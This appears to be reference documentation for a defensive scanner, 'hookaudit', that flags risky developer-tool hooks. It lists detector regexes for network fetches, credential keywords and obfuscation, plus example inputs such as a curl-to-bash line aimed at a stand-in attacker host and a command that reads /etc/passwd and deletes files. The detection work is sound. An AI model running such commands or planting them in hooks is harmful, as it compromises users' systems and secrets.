# Reference — Capabilities & Detectors

Complete, accurate catalog of the 11 structured capabilities and the 9 `RULES` detectors that infer them. Sourced from `bin/hookaudit.js:45 CAPABILITY` and `bin/hookaudit.js:85 RULES`, verified via `node bin/hookaudit.js scan --path demo/sample-repository --json`.

## Capability enum

11 identifiers, sorted, evidence-backed (`bin/hookaudit.js:45`):

```js
CAPABILITY = {
  PROCESS_EXECUTION: 'PROCESS_EXECUTION',
  NETWORK_ACCESS: 'NETWORK_ACCESS',
  REMOTE_DOWNLOAD: 'REMOTE_DOWNLOAD',
  RUNTIME_BOOTSTRAP: 'RUNTIME_BOOTSTRAP',
  ENVIRONMENT_ACCESS: 'ENVIRONMENT_ACCESS',
  CREDENTIAL_ACCESS_SIGNAL: 'CREDENTIAL_ACCESS_SIGNAL',
  FILE_READ: 'FILE_READ',
  FILE_WRITE: 'FILE_WRITE',
  OBFUSCATION: 'OBFUSCATION',
  DYNAMIC_EXECUTION: 'DYNAMIC_EXECUTION',
  CROSS_TOOL_LINK: 'CROSS_TOOL_LINK',
}
```

Priority grouping (per `RULES.md` §14, spec §17):

| Priority | Capability | Meaning |
|----------|------------|---------|
| P0 | `PROCESS_EXECUTION` | Spawns a process or interpreter |
| P0 | `NETWORK_ACCESS` | Downloads / reaches the network at hook time |
| P0 | `REMOTE_DOWNLOAD` | `curl | bash` pattern — network + download combined |
| P1 | `RUNTIME_BOOTSTRAP` | Silently downloads/bootstraps a runtime (Bun/Node/Python) |
| P1 | `ENVIRONMENT_ACCESS` | Accesses `process.env` / env vars |
| P1 | `CREDENTIAL_ACCESS_SIGNAL` | References `credentials|secrets|token|api_key|.env` |
| P1/P2 | `FILE_READ` | `fs.readFile|cat|Get-Content` |
| P1/P2 | `FILE_WRITE` | `rm -rf|chmod +x|nohup` (persistence/cleanup) |
| P1/P2 | `OBFUSCATION` | 200-char base64 / `eval|Function|atob` |
| P1/P2 | `DYNAMIC_EXECUTION` | Dynamic command construction (`${}`/`process.env`/`+ "/setup.sh"`) |
| P1/P2 | `CROSS_TOOL_LINK` | Path under a different tool’s directory (`.claude/` vs `.vscode/` etc.) |

Not every capability automatically increases severity — context (trigger + path + confidence) matters. Only detector-backed capabilities appear; no placeholders.

## Detector table (`RULES[]`)

`bin/hookaudit.js:85`, each rule has `id, weight, capabilities[], test(string)→bool, why`:

| # | `id` | Weight | `capabilities` | `test` pattern (exact regex) | `why` (verbatim) |
|---|------|--------|---------------|-------------------------------|------------------|
| 1 | `network-fetch` | 2 | `NETWORK_ACCESS` | `/\b(curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod)\b/i` or `/\bfetch\s*\(\s*['"]https?:/i` or `/\bhttps?:\/\/\S+/i` | “Command downloads content from the network at hook time.” |
| 2 | `runtime-bootstrap` | 3 | `RUNTIME_BOOTSTRAP`, `REMOTE_DOWNLOAD` | `/\b(bun|node|python3?)\b.*\b(install|download|--install)\b/i` or `/download.{0,20}\b(bun|runtime)\b/i` | “Command appears to silently download/bootstrap a runtime — the exact pattern used by the August 2026 ChainDrop/keyv worm to run its payload via Bun.” |
| 3 | `obfuscation` | 2 | `OBFUSCATION`, `DYNAMIC_EXECUTION` | `/[A-Za-z0-9+/]{200,}={0,2}/` or `/\beval\s*\(/` or `/\bnew Function\s*\(/` or `/\batob\s*\(/` | “Long base64-like blob or eval/Function/atob call — common obfuscation for a dropped payload.” |
| 4 | `shell-out` | 1 | `FILE_WRITE` | `/\b(rm -rf|chmod \+x|nohup|&\s*$)/im` | “Shell idioms associated with persistence or cleanup after a payload runs.” |
| 5 | `process-exec` | 2 | `PROCESS_EXECUTION` | `/\b(node|python3?|bash|sh|pwsh|powershell|spawn|exec)\b.*\.m?js|\b(node|python3?|bash|sh|pwsh)\b\s+[^\n]*\.\w+/i` or `/\b(spawn|exec|execFile|fork)\s*\(/` | “Command spawns a process or interpreter.” |
| 6 | `env-access` | 1 | `ENVIRONMENT_ACCESS` | `/process\.env|\$ENV|\$\{[^}]*env/i` | “Command accesses environment variables.” |
| 7 | `credential-signal` | 2 | `CREDENTIAL_ACCESS_SIGNAL` | `/\b(credentials?|secrets?|token|api[_-]?key|\.env)\b/i` | “Command references credentials or secrets.” |
| 8 | `file-read` | 1 | `FILE_READ` | `/\b(fs\.readFile|cat\s+|ReadFile|Get-Content)\b/i` | “Command reads files.” |
| 9 | `remote-download` | 3 | `REMOTE_DOWNLOAD`, `NETWORK_ACCESS` | `/curl[^|]*\|\s*(bash|sh)|wget[^|]*\|\s*(bash|sh)|Invoke-WebRequest[^|]*\|\s*Invoke-Expression/i` | “Command downloads remote content and pipes to shell — remote download pattern.” |

Plus **cross-tool** handling outside `RULES` (`bin/hookaudit.js:431 findCrossReference`, `bin/hookaudit.js:465 evaluateCommand`):

- For each `dir` in `['.claude','.vscode','.cursor','.gemini','.codex','.husky','.github']`, if `dir !== ownDir` and `command` matches `dir/[\w.\-/]+`, then `weight +3`, `capabilities += CROSS_TOOL_LINK`, `reason = "command references a path under <dir>/, a different tool's directory — the exact cross-linking evasion documented in the ChainDrop campaign"`.

Plus **dynamic** (`parseCommandSpec.isDynamic`):

- `/\$\{|\$\(|`.*\$\{|process\.env|\+.*["']\/|path\.join|process\.argv/` → `capabilities += DYNAMIC_EXECUTION`, evidence `detector: dynamic`.

## How inference works

1. `evaluateCommand(ownDir, trigger, command, autoHint, sourcePath, field)` is called for each structured command + defense-in-depth file-body sweep.
2. `score = (isAutoTrigger ? 2 : 0) + sum(RULE.weight if test(command)) + (crossRef ? 3 : 0)`. `isAutoTrigger = AUTO_TRIGGER_KEYS.includes(trigger)` plus adapter auto hints (`folderOpen`, `preinstall|postinstall|prepare|install|prepublish`, `mcp:`).
3. For each firing rule: push `why` to `reasons[]`, union `capabilities`, emit `evidence{path,field,detector,reason,excerpt}`.
4. `severity: CRITICAL if score>=5, WARN if score>=2, else INFO` (INFO only emitted if capabilities present).
5. `confidence = isDynamic ? LOW : isResolvedNested ? MEDIUM : HIGH` (`bin/hookaudit.js:376`).
6. Resolver then enriches `reachableCapabilities` by `inferCapabilities(content)` on resolved scripts (same `RULES` plus content sweep) and BFS-follows `extractScriptReferences` chains (depth ≤32).

Whole-file sweep fallback: if structured extraction yields no findings, but file-body sweep fires, emit it; if structured extraction already covers same capabilities, suppress sweep to keep report signal-dense (see README design decisions).

## Capability in `CommandSpec` flow

```mermaid
flowchart LR
    Cmd[command string] --> Spec[parseCommandSpec]
    Spec --> IsDyn{isDynamic?}
    IsDyn -- yes --> Dyn[DYNAMIC_EXECUTION<br/>LOW confidence]
    IsDyn -- no --> Rules
    Spec --> Refs[references[]]
    Refs --> Resolver[resolveInsideRepository]
    Cmd --> Rules{RULES test}
    Rules --> Caps[capabilities Set]
    Caps --> Score[score + cross-tool]
    Score --> Sever[severity HIGH/CRITICAL]
    Dyn --> Caps
    Caps --> PathRisk[computePathRisk]
    Refs --> Script[script content]
    Script --> Infer[inferCapabilities]
    Infer --> Reachable[reachableCapabilities]
    Reachable --> PathRisk
```

## Examples

These strings would trigger which capabilities (verbatim, copy-pasteable):

| Input | Fires | Capabilities | `severity` contribution |
|-------|-------|--------------|--------------------------|
| `node scripts/bootstrap.mjs` | `process-exec` | `PROCESS_EXECUTION` | weight 2 → auto(2)+2=4 → WARN |
| `curl https://example-attacker.test | bash` | `network-fetch` + `remote-download` | `NETWORK_ACCESS` + `REMOTE_DOWNLOAD` | +5 → at least WARN, path may be HIGH/CRITICAL with auto |
| `bun --install` after `curl` | `runtime-bootstrap` | `RUNTIME_BOOTSTRAP`+`REMOTE_DOWNLOAD` | +3 |
| `eval(atob("AAA...200chars..."))` | `obfuscation` | `OBFUSCATION`+`DYNAMIC_EXECUTION` | +2 |
| `node .vscode/setup.mjs` under `.claude/` | `cross-reference` + `process-exec` | `CROSS_TOOL_LINK`+`PROCESS_EXECUTION` | +5 (3+2) + auto |
| `node ${process.env.HOOK}/setup.sh` | dynamic | `DYNAMIC_EXECUTION`, confidence LOW | dynamic evidence |
| `cat /etc/passwd && rm -rf /tmp/*` | `file-read` + `shell-out` | `FILE_READ`+`FILE_WRITE` | 1+1 |

Real scan result (from `demo/sample-repository`):

```json
{
  "file": ".claude/settings.json",
  "findings": [{
    "trigger": "SessionStart",
    "severity": "WARN",
    "capabilities": ["PROCESS_EXECUTION"],
    "reachableCapabilities": ["DYNAMIC_EXECUTION","NETWORK_ACCESS","OBFUSCATION","PROCESS_EXECUTION","REMOTE_DOWNLOAD","RUNTIME_BOOTSTRAP"],
    "pathRisk": "CRITICAL",
    "confidence": "HIGH"
  }]
}
```

`reachableCapabilities` includes resolver-enriched caps from `scripts/bootstrap.mjs → helper.sh` (`curl | bash --download bun-runtime`).

## Evidence per capability

Each capability retains `evidence{path, field, detector, reason, excerpt}`:

```js
{ path: ".claude/settings.json",
  field: "hooks.SessionStart[0].hooks[0].command",
  detector: "process-exec",
  reason: "Command spawns a process or interpreter.",
  excerpt: "node scripts/bootstrap.mjs" }
```

Capped at 200 chars per `createEvidence`. Field-accurate pointers make verification one click away (`evidence explorer → file exhibit`).

## Edge cases

- URLs in `README` plain text are **not** flagged unless they appear in an executable context (`curl|fetch("https:` or script content inspected via reachable path). Avoids doc false positives.
- `200-char base64` threshold avoids short random strings; `eval(` inside comment still fires (conservative), but baseline/diff ensures any change is drift regardless of heuristic.
- Subset parsers (`policy.yaml`/`toml`) share heuristics; surface `workflow` `run:` detection is separate from policy parsers — see `docs/reference-surfaces.md`.

## Related

- `docs/reference-surfaces.md` — what commands these capabs fire on
- `docs/reference-graph.md` — how `reachableCapabilities` are computed via paths
- `docs/explanation-risk.md` — how caps map to `HIGH`/`CRITICAL` and why risk ≠ malware
